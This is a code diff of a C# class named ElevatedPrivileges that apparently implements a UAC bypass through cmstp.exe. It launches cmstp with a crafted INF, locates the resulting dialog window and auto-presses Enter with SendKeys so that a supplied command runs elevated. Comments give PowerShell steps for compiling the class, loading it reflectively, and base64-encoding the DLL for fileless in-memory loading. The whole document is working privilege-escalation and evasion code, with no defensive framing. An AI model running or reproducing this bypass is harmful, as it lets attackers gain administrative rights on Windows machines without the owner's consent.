@@ -1,20 +1,26 @@
 ﻿using System;
 using System.Diagnostics;
 using System.IO;
+using System.Linq;
 using System.Runtime.InteropServices;
 using System.Text;
+using System.Windows.Forms;
 
 /// <summary>
-/// Add-Type -TypeDefinition ([IO.File]::ReadAllText("$pwd\ElevatedPrivileges.cs")) -OutputAssembly "ElevatedPrivileges.dll"
+/// Add-Type -TypeDefinition ([IO.File]::ReadAllText("$pwd\ElevatedPrivileges.cs")) -ReferencedAssemblies "System.Windows.Forms" -OutputAssembly "ElevatedPrivileges.dll"
 /// [Reflection.Assembly]::Load([IO.File]::ReadAllBytes("$pwd\ElevatedPrivileges.dll"))
 /// If (([Management.Automation.PSTypeName]'ElevatedPrivileges').Type) { [ElevatedPrivileges]::Invoke("C:\ScheduledTask\ScheduledTask.exe") }
+/// [Convert]::ToBase64String((Get-Content -Path .\ElevatedPrivileges.dll -Encoding Byte))
+/// [Reflection.Assembly]::Load([Convert]::FromBase64String("")) | Out-Null
 /// </summary>
 public class ElevatedPrivileges
 {
     public enum CmdShow { SW_SHOW = 5 }
-    public enum Message { WM_KEYDOWN = 0x0100 }
+    public enum Message { WM_KEYDOWN = 0x0100, WM_KEYUP = 0x0101 }
     public enum KeyCodes { VK_RETURN = 0x0D }
 
+    [DllImport("user32.dll", CharSet = CharSet.Unicode)]
+    public static extern IntPtr FindWindow(string className, string windowName);
     [DllImport("user32.dll")]
     public static extern bool ShowWindow(IntPtr hWnd, CmdShow cmdShow);
     [DllImport("user32.dll")]
@@ -54,6 +60,44 @@ ShortSvcName=""ed23c88e-8b38-4afe-be0f-cde578e23259""
         return path;
     }
 
+    public static bool FindWindow()
+    {
+        var hWnd = FindWindow("#32770", "ElevatedPrivileges");
+
+        if (hWnd != IntPtr.Zero && SetForegroundWindow(hWnd) && ShowWindow(hWnd, CmdShow.SW_SHOW))
+        {
+            //SendMessage(hWnd, Message.WM_KEYDOWN, KeyCodes.VK_RETURN);
+            //SendMessage(hWnd, Message.WM_KEYUP, KeyCodes.VK_RETURN);
+            SendKeys.SendWait("{ENTER}");
+            return true;
+        }
+
+        return false;
+    }
+
+    public static bool FindWindowByProcess()
+    {
+        var proc = Process.GetProcessesByName("cmstp").SingleOrDefault();
+
+        if (proc == null)
+        {
+            return false;
+        }
+
+        proc.Refresh();
+        var hWnd = proc.MainWindowHandle;
+
+        if (hWnd != IntPtr.Zero && SetForegroundWindow(hWnd) && ShowWindow(hWnd, CmdShow.SW_SHOW))
+        {
+            //SendMessage(hWnd, Message.WM_KEYDOWN, KeyCodes.VK_RETURN);
+            //SendMessage(hWnd, Message.WM_KEYUP, KeyCodes.VK_RETURN);
+            SendKeys.SendWait("{ENTER}");
+            return true;
+        }
+
+        return false;
+    }
+
     public static bool Invoke(string cmdsHere)
     {
         var cmstp = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "cmstp.exe");
@@ -84,11 +128,7 @@ ShortSvcName=""ed23c88e-8b38-4afe-be0f-cde578e23259""
             }
         }
 
-        if (hWnd != IntPtr.Zero && SetForegroundWindow(hWnd) && ShowWindow(hWnd, CmdShow.SW_SHOW))
-        {
-            SendMessage(hWnd, Message.WM_KEYDOWN, KeyCodes.VK_RETURN);
-        }
-
+        FindWindowByProcess();
         proc.WaitForExit();
         return (proc.ExitCode == 0);
     }
